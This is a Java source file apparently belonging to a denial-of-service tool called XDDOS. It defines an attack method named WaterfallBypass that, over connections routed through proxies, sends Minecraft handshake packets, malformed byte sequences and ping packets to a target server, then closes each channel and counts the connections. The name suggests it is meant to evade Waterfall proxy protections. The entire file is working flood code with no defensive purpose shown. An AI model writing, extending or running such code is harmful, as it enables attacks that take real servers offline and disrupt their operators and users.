package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.PingPacket;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class WaterfallBypass
implements Method{

    final int a = Integer.parseInt(System.getProperty("len", "25555"));
  public byte[] ad = new byte[] { Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE, Byte.MAX_VALUE, Byte.MIN_VALUE };
  private byte[] handshakebytes = (new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2)).getWrappedPacket();


  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshakebytes));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    channel.writeAndFlush(Integer.valueOf(1));
    channel.writeAndFlush(Integer.valueOf(0));
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.ad));
    channel.writeAndFlush(Unpooled.buffer().writeZero(0));
    channel.writeAndFlush(Unpooled.buffer().writeMediumLE(654654));
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new PingPacket(System.currentTimeMillis())).getWrappedPacket()));
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }

}
